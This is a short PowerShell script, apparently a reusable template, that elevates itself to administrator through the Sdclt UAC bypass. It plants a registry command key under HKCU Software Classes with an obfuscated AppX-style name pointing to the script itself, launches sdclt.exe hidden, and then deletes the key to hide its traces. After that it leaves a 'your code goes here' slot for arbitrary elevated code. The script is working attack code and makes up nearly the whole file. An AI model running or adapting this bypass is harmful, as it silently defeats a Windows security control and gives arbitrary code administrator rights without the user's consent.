function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[INFO] Using Sdclt bypass..." -ForegroundColor Yellow
    
    $regPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "$PSCommandPath" -Force
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
    
    Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "`n[+] Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
